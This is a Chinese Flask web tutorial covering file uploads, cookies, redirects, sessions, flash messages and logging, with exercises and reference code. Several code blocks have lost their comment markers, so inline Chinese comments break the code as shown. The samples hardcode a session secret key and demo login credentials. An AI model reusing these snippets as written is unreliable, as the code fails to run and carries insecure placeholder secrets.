<p>下面是一个简单的例子用来演示提交文件到服务器上:<br><figure class="highlight ruby"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">from flask import request</span><br><span class="line"></span><br><span class="line">@app.route(<span class="string">'/upload'</span>, methods=[<span class="string">'GET'</span>, <span class="string">'POST'</span>])</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">upload_file</span><span class="params">()</span></span><span class="symbol">:</span></span><br><span class="line">    <span class="keyword">if</span> request.method == <span class="string">'POST'</span><span class="symbol">:</span></span><br><span class="line">        f = request.files[<span class="string">'the_file'</span>]</span><br><span class="line">        f.save(<span class="string">'/var/www/uploads/uploaded_file.txt'</span>)</span><br><span class="line">    ...</span><br></pre></td></tr></table></figure></p>
<p>如果你想要知道在上传到你的应用之前在客户端的文件名称，你可以访问filename属性。<br>但请记住永远不要信任这个值，因为这个值可以伪造。如果你想要使用客户端的文件名来在服务器上存储文件，把它传递到Werkzeug提供给你的secure_filename()函数:</p>
<figure class="highlight clean"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> flask <span class="keyword">import</span> request</span><br><span class="line"><span class="keyword">from</span> werkzeug <span class="keyword">import</span> secure_filename</span><br><span class="line"></span><br><span class="line">@app.route(<span class="string">'/upload'</span>, methods=[<span class="string">'GET'</span>, <span class="string">'POST'</span>])</span><br><span class="line">def upload_file():</span><br><span class="line">    <span class="keyword">if</span> request.method == <span class="string">'POST'</span>:</span><br><span class="line">        f = request.files[<span class="string">'the_file'</span>]</span><br><span class="line">        f.save(<span class="string">'/var/www/uploads/'</span> + secure_filename(f.filename))</span><br><span class="line">    ...</span><br></pre></td></tr></table></figure>
<h1 id="cookies"><a href="#cookies" class="headerlink" title="cookies"></a>cookies</h1><p>你可以用 cookies 属性来访问 Cookies 。你能够用响应对象的 set_cookie 来设置 cookies。请求对象中的 cookies 属性是一个客户端发送所有的 cookies 的字典。</p>
<p>如果你要使用会话(sessions)，请不要直接使用 cookies，相反，请用 Flask 中的会话，Flask 已经在cookies 上增加了一些安全细节；关于更多 seesions 和 cookies 的区别与联系，请参见施杨出品的博客。</p>
<p>读取 cookies:<br><figure class="highlight processing"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">from flask <span class="keyword">import</span> request</span><br><span class="line"></span><br><span class="line">@app.route(<span class="string">'/'</span>)</span><br><span class="line">def index():</span><br><span class="line">    username = request.cookies.<span class="built_in">get</span>(<span class="string">'username'</span>)</span><br><span class="line">     注意这里引用cookies字典的键值对是使用cookies.<span class="built_in">get</span>(<span class="built_in">key</span>)</span><br><span class="line">     而不是cookies[<span class="built_in">key</span>]，这是防止该字典不存在时报错<span class="string">"keyerror"</span></span><br></pre></td></tr></table></figure></p>
<p>存储 cookies:<br><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> flask <span class="keyword">import</span> make_response</span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route('/')</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">index</span><span class="params">()</span>:</span></span><br><span class="line">    resp = make_response(render_template(...))</span><br><span class="line">    resp.set_cookie(<span class="string">'username'</span>, <span class="string">'the username'</span>)</span><br><span class="line">    <span class="keyword">return</span> resp</span><br></pre></td></tr></table></figure></p>
<p>注意cookies是在响应对象中被设置。由于通常只是从视图函数返回字符串，Flask 会将其转换为响应对象。如果你要显式地这么做，可以使用 make_response() 函数接着修改它。</p>
<p>有时候你可能要在响应对象不存在的地方设置cookie。利用延迟请求回调模式使得这种情况成为可能。</p>
<p>本节讲解了 flask 的请求，如果想在没有请求的情况下获取上下文，可以使用test_request_context()或者request_context()，从request对象的form中可以获取表单的数据，args中可以获取 URL 中的参数，files可以获取上传的文件，cookies可以操作cookie。</p>
<h2 id="练习"><a href="#练习" class="headerlink" title="练习"></a>练习</h2><p>请实现一个上传图片到服务器的功能。具体要求如下：</p>
<p>在 /home/shiyanlou/Code 目录下新建 upload_file.py 文件并在其中写入本练习的代码。<br>要求上传的文件保存位置为 /home/shiyanlou/Code 目录下。<br>当访问首页 <a href="http://127.0.0.1" target="_blank" rel="noopener">http://127.0.0.1</a> 时出现表单可以上传文件，<br>当上传成功后在浏览器可以看到 &lt;上传的文件名&gt; upload successed!</p>
<p>参考代码<br>在 /home/shiyanlou/Code/upload_file.py 文件中添加如下代码：<br><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> os</span><br><span class="line"><span class="keyword">from</span> flask <span class="keyword">import</span> Flask, request</span><br><span class="line"><span class="keyword">from</span> werkzeug <span class="keyword">import</span> secure_filename    获取上传文件的文件名</span><br><span class="line"></span><br><span class="line">UPLOAD_FOLDER = <span class="string">'/home/shiyanlou/Code'</span>    上传路径</span><br><span class="line">ALLOWED_EXTENSIONS = set([<span class="string">'txt'</span>, <span class="string">'pdf'</span>, <span class="string">'png'</span>, <span class="string">'jpg'</span>, <span class="string">'jpeg'</span>, <span class="string">'gif'</span>])    允许上传的文件类型</span><br><span class="line"></span><br><span class="line">app = Flask(__name__)</span><br><span class="line">app.config[<span class="string">'UPLOAD_FOLDER'</span>] = UPLOAD_FOLDER</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">allowed_file</span><span class="params">(filename)</span>:</span>    验证上传的文件名是否符合要求，文件名必须带点并且符合允许上传的文件类型要求，两者都满足则返回 true</span><br><span class="line">    <span class="keyword">return</span> <span class="string">'.'</span> <span class="keyword">in</span> filename <span class="keyword">and</span> \</span><br><span class="line">           filename.rsplit(<span class="string">'.'</span>, <span class="number">1</span>)[<span class="number">1</span>] <span class="keyword">in</span> ALLOWED_EXTENSIONS</span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route('/', methods=['GET', 'POST'])</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">upload_file</span><span class="params">()</span>:</span></span><br><span class="line">    <span class="keyword">if</span> request.method == <span class="string">'POST'</span>:    如果是 POST 请求方式</span><br><span class="line">        file = request.files[<span class="string">'file'</span>]    获取上传的文件</span><br><span class="line">        <span class="keyword">if</span> file <span class="keyword">and</span> allowed_file(file.filename):    如果文件存在并且符合要求则为 true</span><br><span class="line">            filename = secure_filename(file.filename)    获取上传文件的文件名</span><br><span class="line">            file.save(os.path.join(app.config[<span class="string">'UPLOAD_FOLDER'</span>], filename))    保存文件</span><br><span class="line">            <span class="keyword">return</span> <span class="string">'&amp;#123;&amp;#125; upload successed!'</span>.format(filename)    返回保存成功的信息</span><br><span class="line">     使用 GET 方式请求页面时或是上传文件失败时返回上传文件的表单页面</span><br><span class="line">    <span class="keyword">return</span> <span class="string">'''</span></span><br><span class="line"><span class="string">    &lt;!doctype html&gt;</span></span><br><span class="line"><span class="string">    &lt;title&gt;Upload new File&lt;/title&gt;</span></span><br><span class="line"><span class="string">    &lt;h1&gt;Upload new File&lt;/h1&gt;</span></span><br><span class="line"><span class="string">    &lt;form action="" method=post enctype=multipart/form-data&gt;</span></span><br><span class="line"><span class="string">      &lt;p&gt;&lt;input type=file name=file&gt;</span></span><br><span class="line"><span class="string">         &lt;input type=submit value=Upload&gt;</span></span><br><span class="line"><span class="string">    &lt;/form&gt;</span></span><br><span class="line"><span class="string">    '''</span></span><br></pre></td></tr></table></figure></p>
<h1 id="重定向、响应、会话和扩展"><a href="#重定向、响应、会话和扩展" class="headerlink" title="重定向、响应、会话和扩展"></a>重定向、响应、会话和扩展</h1><h2 id="重定向和错误"><a href="#重定向和错误" class="headerlink" title="重定向和错误"></a>重定向和错误</h2><p>你能够用redirect()函数重定向用户到其它地方。能够用abort()函数提前中断一个请求并带有一个错误代码。</p>
<p>下面是一个演示它们如何工作的例子，在 /home/shiyanlou/Code/ 目录下新建 hello.py 文件并向其中写入如下代码：<br><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> flask <span class="keyword">import</span> Flask</span><br><span class="line"><span class="keyword">from</span> flask <span class="keyword">import</span> abort, redirect, url_for</span><br><span class="line"></span><br><span class="line">app = Flask(__name__)</span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route('/')</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">index</span><span class="params">()</span>:</span></span><br><span class="line">    <span class="keyword">return</span> redirect(url_for(<span class="string">'login'</span>))</span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route('/login')</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">login</span><span class="params">()</span>:</span></span><br><span class="line">    abort(<span class="number">401</span>)</span><br><span class="line">    this_is_never_executed()</span><br></pre></td></tr></table></figure></p>
<p>按照之前的方式运行应用，这是一个相当无意义的例子因为用户会从主页/重定向到一个不能访问的页面/login（ 401 意味着禁止访问），但是它说明了重定向如何工作。</p>
<p>默认情况下，每个错误代码会显示一个黑白错误页面。比如上面的页面会显示 401 Unauthorized。<br>如果你想定制错误页面，可以使用errorhandler()装饰器，向 /home/shiyanlou/Code/hello.py 文件中添加如下代码:<br><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> flask <span class="keyword">import</span> render_template</span><br><span class="line"></span><br><span class="line"><span class="meta">@app.errorhandler(401)</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">page_not_found</span><span class="params">(error)</span>:</span></span><br><span class="line">    <span class="keyword">return</span> render_template(<span class="string">'page_not_found.html'</span>), <span class="number">404</span></span><br></pre></td></tr></table></figure></p>
<p>注意到 404 是在render_template()调用之后。告诉 Flask 该页的错误代码应是 404 ，即没有找到。默认的 200 被假定为：一切正常。</p>
<p>在 /home/shiyanlou/Code 目录下新建 templates 文件夹，并在其中新建 page_not_found.html 文件。<br>向 page_not_found.html 文件中添加如下代码：<br><figure class="highlight xl"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;h1&gt;<span class="built_in">page</span> <span class="built_in">not</span> found, this <span class="keyword">is</span> an error <span class="built_in">page</span>.&lt;/h1&gt;</span><br></pre></td></tr></table></figure></p>
<h2 id="响应"><a href="#响应" class="headerlink" title="响应"></a>响应</h2><p>一个视图函数的返回值会被自动转换为一个响应对象。如果返回值是一个字符串，它被转换成一个响应主体是该字符串，错误代码为 200 OK ，媒体类型为text/html的响应对象。Flask 把返回值转换成响应对象的逻辑如下：</p>
<p>如果返回的是一个合法的响应对象，它会直接从视图返回。<br>如果返回的是一个字符串，响应对象会用字符串数据和默认参数创建。<br>如果返回的是一个元组而且元组中元素能够提供额外的信息。这样的元组必须是(response, status, headers) 形式且至少含有其中的一个元素。status值将会覆盖状态代码，headers可以是一个列表或额外的消息头值字典。<br>如果上述条件均不满足，Flask 会假设返回值是一个合法的 WSGI 应用程序，并转换为一个请求对象。<br>如果你想要获取在视图中得到的响应对象，你可以用函数make_response()。</p>
<p>想象你有这样一个视图:<br><figure class="highlight ruby"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">@app.errorhandler(<span class="number">404</span>)</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">not_found</span><span class="params">(error)</span></span><span class="symbol">:</span></span><br><span class="line">    <span class="keyword">return</span> render_template(<span class="string">'error.html'</span>), <span class="number">404</span></span><br></pre></td></tr></table></figure></p>
<p>你只需要用make_response()封装返回表达式，获取结果对象并修改，然后返回它：<br><figure class="highlight ruby"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">@app.errorhandler(<span class="number">404</span>)</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">not_found</span><span class="params">(error)</span></span><span class="symbol">:</span></span><br><span class="line">    resp = make_response(render_template(<span class="string">'error.html'</span>), <span class="number">404</span>)</span><br><span class="line">    resp.headers[<span class="string">'X-Something'</span>] = <span class="string">'A value'</span></span><br><span class="line">    <span class="keyword">return</span> resp</span><br></pre></td></tr></table></figure></p>
<h2 id="会话"><a href="#会话" class="headerlink" title="会话"></a>会话</h2><p>除了请求对象，还有第二个称为session对象允许你在不同请求间存储特定用户的信息。这是在 cookies 的基础上实现的，并且在 cookies 中使用加密的签名。这意味着用户可以查看 cookie 的内容，但是不能修改它，除非知道签名的密钥。</p>
<p>要使用会话，你需要设置一个密钥。这里介绍会话如何工作，在 /home/shiyanlou/Code 目录下新建 test.py 文件并写入如下代码：<br><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> flask <span class="keyword">import</span> Flask, session, redirect, url_for, escape, request</span><br><span class="line"></span><br><span class="line">app = Flask(__name__)</span><br><span class="line"></span><br><span class="line"> 设置密钥，保证会话安全</span><br><span class="line">app.secret_key = <span class="string">'_5#y2L"F4Q8z\n\xec]/'</span></span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route('/')</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">index</span><span class="params">()</span>:</span></span><br><span class="line">    <span class="keyword">if</span> <span class="string">'username'</span> <span class="keyword">in</span> session:</span><br><span class="line">        <span class="keyword">return</span> <span class="string">'Logged in as %s'</span> % escape(session[<span class="string">'username'</span>])</span><br><span class="line">    <span class="keyword">return</span> <span class="string">'You are not logged in'</span></span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route('/login', methods=['GET', 'POST'])</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">login</span><span class="params">()</span>:</span></span><br><span class="line">    <span class="keyword">if</span> request.method == <span class="string">'POST'</span>:</span><br><span class="line">        session[<span class="string">'username'</span>] = request.form[<span class="string">'username'</span>]</span><br><span class="line">        <span class="keyword">return</span> redirect(url_for(<span class="string">'index'</span>))</span><br><span class="line">    <span class="keyword">return</span> <span class="string">'''</span></span><br><span class="line"><span class="string">        &lt;form method="post"&gt;</span></span><br><span class="line"><span class="string">            &lt;p&gt;&lt;input type=text name=username&gt;</span></span><br><span class="line"><span class="string">            &lt;p&gt;&lt;input type=submit value=Login&gt;</span></span><br><span class="line"><span class="string">        &lt;/form&gt;</span></span><br><span class="line"><span class="string">    '''</span></span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route('/logout')</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">logout</span><span class="params">()</span>:</span></span><br><span class="line">     如果用户名存在，则从会话中移除该用户名</span><br><span class="line">    session.pop(<span class="string">'username'</span>, <span class="keyword">None</span>)</span><br><span class="line">    <span class="keyword">return</span> redirect(url_for(<span class="string">'index'</span>))</span><br></pre></td></tr></table></figure></p>
<p>这里提到的escape()可以在你不使用模板引擎的时候做转义（如同本例）。其中，login函数中返回的网页源代码可以单独存储在templates文件夹中作为模板文件html，然后使用return render_template()更方便。</p>
<p>按照前面的方式运行程序：</p>
<p>当访问首页 <a href="http://127.0.0.1:5000/" target="_blank" rel="noopener">http://127.0.0.1:5000/</a> 时会显示 You are not logged in；</p>
<p>当访问登录页面 <a href="http://127.0.0.1:5000/login" target="_blank" rel="noopener">http://127.0.0.1:5000/login</a> 时会出现一个输入框，在输入框中输入用户名 shiyanlou，然后点击 Login 按钮，这时 URL 会重定向到首页上，首页显示 Logged in as shiyanlou；</p>
<p>最后再访问登出页面 <a href="http://127.0.0.1:5000/logout，这时从" target="_blank" rel="noopener">http://127.0.0.1:5000/logout，这时从</a> session 中移除了用户名，URL 重定向到首页显示 You are not logged in；</p>
<p>怎样产生一个好的密钥：</p>
<p>随机的问题在于很难判断什么是真随机。一个密钥应该足够随机。你的操作系统可以基于一个密码随机生成器来生成漂亮的随机值，这个值可以用来做密钥:<br><figure class="highlight taggerscript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">$ python3 -c 'import os; print(os.urandom(16))'</span><br><span class="line">b'm <span class="symbol">\x</span>f8&gt;]?<span class="symbol">\x</span>86<span class="symbol">\x</span>cf/y<span class="symbol">\x</span>0e<span class="symbol">\x</span>c5<span class="symbol">\x</span>c7j<span class="symbol">\x</span>c5/'</span><br></pre></td></tr></table></figure></p>
<p>把这个值复制粘贴到你的代码，你就搞定了密钥。</p>
<p>使用基于 cookie 的会话需注意: Flask 会将你放进会话（session）对象的值序列化到 cookie 。如果你试图寻找一个跨请求不能存留的值，cookies 确实是启用的，并且你不会获得明确的错误信息，检查你页面请求中 cookie 的大小，并与 web 浏览器所支持的大小对比。</p>
<h2 id="消息"><a href="#消息" class="headerlink" title="消息"></a>消息</h2><p>好的应用和用户界面全部是关于反馈。如果用户得不到足够的反馈，他们可能会变得讨厌这个应用。Flask 提供了一个真正的简单的方式来通过消息闪现系统给用户反馈。消息闪现系统基本上使得在请求结束时记录信息并在下一个 （且仅在下一个）请求中访问。通常结合模板布局来显示消息。</p>
<p>使用flash()方法来闪现一个消息，使用get_flashed_messages()能够获取消息，get_flashed_messages()也能用于模板中。</p>
<p>下面来看一个简单的例子，在 /home/shiyanlou/Code 目录下新建 flashTest.py 文件，并向其中写入如下代码：<br><figure class="highlight ruby"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line">from flask import Flask, flash, redirect, render_template, \</span><br><span class="line">     request, url_for</span><br><span class="line"></span><br><span class="line">app = Flask(__name_<span class="number">_</span>)</span><br><span class="line">app.secret_key = b<span class="string">'_5#y2L"F4Q8z\n\xec]/'</span></span><br><span class="line"></span><br><span class="line">@app.route(<span class="string">'/'</span>)</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">index</span><span class="params">()</span></span><span class="symbol">:</span></span><br><span class="line">    <span class="keyword">return</span> render_template(<span class="string">'index.html'</span>)</span><br><span class="line"></span><br><span class="line">@app.route(<span class="string">'/login'</span>, methods=[<span class="string">'GET'</span>, <span class="string">'POST'</span>])</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">login</span><span class="params">()</span></span><span class="symbol">:</span></span><br><span class="line">    error = None</span><br><span class="line">    <span class="keyword">if</span> request.method == <span class="string">'POST'</span><span class="symbol">:</span></span><br><span class="line">        <span class="keyword">if</span> request.form[<span class="string">'username'</span>] != <span class="string">'admin'</span> <span class="keyword">or</span> \</span><br><span class="line">                request.form[<span class="string">'password'</span>] != <span class="string">'secret'</span><span class="symbol">:</span></span><br><span class="line">            error = <span class="string">'Invalid credentials'</span></span><br><span class="line">        <span class="symbol">else:</span></span><br><span class="line">            flash(<span class="string">'You were successfully logged in'</span>)</span><br><span class="line">            <span class="keyword">return</span> redirect(url_for(<span class="string">'index'</span>))</span><br><span class="line">    <span class="keyword">return</span> render_template(<span class="string">'login.html'</span>, error=error)</span><br></pre></td></tr></table></figure></p>
<p>然后在 /home/shiyanlou/Code/templates 目录下新建 base.html 页面，其中写入基本的模板代码，代码主要是从后端获取 flash 消息以及错误信息。</p>
<figure class="highlight cal"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">&lt;!doctype html&gt;</span><br><span class="line">&lt;title&gt;My Application&lt;/title&gt;</span><br><span class="line">&amp;<span class="string">#123</span>;% <span class="keyword">with</span> messages = get_flashed_messages() %&amp;<span class="string">#125</span>;</span><br><span class="line">  &amp;<span class="string">#123</span>;% <span class="keyword">if</span> messages %&amp;<span class="string">#125</span>;</span><br><span class="line">    &lt;ul class=flashes&gt;</span><br><span class="line">    &amp;<span class="string">#123</span>;% <span class="keyword">for</span> message <span class="keyword">in</span> messages %&amp;<span class="string">#125</span>;</span><br><span class="line">      &lt;li&gt;&amp;<span class="string">#123</span>;&amp;<span class="string">#123</span>; message &amp;<span class="string">#125</span>;&amp;<span class="string">#125</span>;&lt;/li&gt;</span><br><span class="line">    &amp;<span class="string">#123</span>;% endfor %&amp;<span class="string">#125</span>;</span><br><span class="line">    &lt;/ul&gt;</span><br><span class="line">  &amp;<span class="string">#123</span>;% endif %&amp;<span class="string">#125</span>;</span><br><span class="line">&amp;<span class="string">#123</span>;% endwith %&amp;<span class="string">#125</span>;</span><br><span class="line">&amp;<span class="string">#123</span>;% block body %&amp;<span class="string">#125</span>;&amp;<span class="string">#123</span>;% endblock %&amp;<span class="string">#125</span>;</span><br></pre></td></tr></table></figure>
<p>在该目录下新建 index.html 页面，这个页面继承于 base.html 页面：<br><figure class="highlight lasso"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">&amp;#123;% extends <span class="string">"base.html"</span> %&amp;#125;</span><br><span class="line">&amp;#123;% block body %&amp;#125;</span><br><span class="line">  &lt;h1&gt;Overview&lt;/h1&gt;</span><br><span class="line">  &lt;p&gt;<span class="keyword">Do</span> you want <span class="keyword">to</span> &lt;a href=<span class="string">"&amp;#123;&amp;#123; url_for('login') &amp;#125;&amp;#125;"</span>&gt;<span class="keyword">log</span> <span class="keyword">in</span>?&lt;/a&gt;</span><br><span class="line">&amp;#123;% endblock %&amp;#125;</span><br></pre></td></tr></table></figure></p>
<p>在该目录下新建 login.html 页面，这个页面也继承于 base.html 页面：.<br><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">&amp;#123;% extends "base.html" %&amp;#125;</span><br><span class="line">&amp;#123;% block body %&amp;#125;</span><br><span class="line">  <span class="tag">&lt;<span class="name">h1</span>&gt;</span>Login<span class="tag">&lt;/<span class="name">h1</span>&gt;</span></span><br><span class="line">  &amp;#123;% if error %&amp;#125;</span><br><span class="line">    <span class="tag">&lt;<span class="name">p</span> <span class="attr">class</span>=<span class="string">error</span>&gt;</span><span class="tag">&lt;<span class="name">strong</span>&gt;</span>Error:<span class="tag">&lt;/<span class="name">strong</span>&gt;</span> &amp;#123;&amp;#123; error &amp;#125;&amp;#125;</span><br><span class="line">  &amp;#123;% endif %&amp;#125;</span><br><span class="line">  <span class="tag">&lt;<span class="name">form</span> <span class="attr">method</span>=<span class="string">post</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">dl</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">dt</span>&gt;</span>Username:</span><br><span class="line">      <span class="tag">&lt;<span class="name">dd</span>&gt;</span><span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">text</span> <span class="attr">name</span>=<span class="string">username</span> <span class="attr">value</span>=<span class="string">"&amp;#123;&amp;#123;</span></span></span><br><span class="line"><span class="tag"><span class="string">          request.form.username &amp;#125;&amp;#125;"</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">dt</span>&gt;</span>Password:</span><br><span class="line">      <span class="tag">&lt;<span class="name">dd</span>&gt;</span><span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">password</span> <span class="attr">name</span>=<span class="string">password</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">dl</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">p</span>&gt;</span><span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">submit</span> <span class="attr">value</span>=<span class="string">Login</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;/<span class="name">form</span>&gt;</span></span><br><span class="line">&amp;#123;% endblock %&amp;#125;</span><br></pre></td></tr></table></figure></p>
<p>按照前面的方式运行程序：</p>
<p>当访问首页 <a href="http://127.0.0.1:5000，会提示" target="_blank" rel="noopener">http://127.0.0.1:5000，会提示</a> Do you want to log in?，点击链接跳转到登录页面。</p>
<p>在登录页面 <a href="http://127.0.0.1:5000/login，输入用户名和密码，如果输入错误的信息比如两个都为" target="_blank" rel="noopener">http://127.0.0.1:5000/login，输入用户名和密码，如果输入错误的信息比如两个都为</a> shiyanlou，点击 Login，就会出现错误提示 Error: Invalid credentials。如果用户名输入 admin、密码输入 secret，点击 Login，就会跳转到首页，同时在首页会显示 flash 消息 You were successfully logged in。</p>
<h2 id="日志"><a href="#日志" class="headerlink" title="日志"></a>日志</h2><p>有时候你会遇到一种情况：理论上来说你处理的数据应该是正确的，然而实际上并不正确的状况。比如你可能有一些客户端代码，代码向服务器发送一个 HTTP 请求但是显然它是错误的。这可能是由于用户篡改数据，或客户端代码失败。大部分时候针对这一情况返回400 Bad Request就可以了，但是有时候不能这样做，代码必须继续工作。</p>
<p>你也有可能想要记录一些发生的不正常事情。这时候日志就派上用处。从 Flask 0.3 开始日志记录是预先配置好的。</p>
<p>这里有一些日志调用的例子:</p>
<p>app.logger.debug(‘A value for debugging’)<br>app.logger.warning(‘A warning occurred (%d apples)’, 42)<br>app.logger.error(‘An error occurred’)<br>附带的 logger 是一个标准的日志类 Logger ，因此更多的信息请查阅官方文档 logging documentation。</p>
<p>整合 WSGI 中间件<br>如果你想给你的应用添加 WSGI 中间件，你可以封装内部 WSGI 应用。例如如果你想使用 Werkzeug 包中的某个中间件来应付 lighttpd 中的 bugs，你可以这样做:</p>
<p>from werkzeug.contrib.fixers import LighttpdCGIRootFix<br>app.wsgi_app = LighttpdCGIRootFix(app.wsgi_app)</p>
<h2 id="练习-1"><a href="#练习-1" class="headerlink" title="练习"></a>练习</h2><p>请实现一个完整的用户登录功能:</p>
<p>当访问地址 <a href="http://127.0.0.1:5000/login" target="_blank" rel="noopener">http://127.0.0.1:5000/login</a> ，出现登录页面，可以使用用户名和密码填写登录表单。<br>如果用户名和密码都为shiyanlou，那么就把用户名数据放到session中，把地址重定向到首页显示Hello shiyanlou，同时闪现消息 you were logged in。<br>如果用户名和密码不对，依然把地址重定向到首页显示hello world，同时闪现消息 username or password invalid。<br>参考答案<br>文件目录结构如下所示：<br><figure class="highlight jboss-cli"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="string">/app.py</span></span><br><span class="line"><span class="string">/templates</span></span><br><span class="line">    <span class="string">/index.html</span></span><br><span class="line">    <span class="string">/login.html</span></span><br></pre></td></tr></table></figure></p>
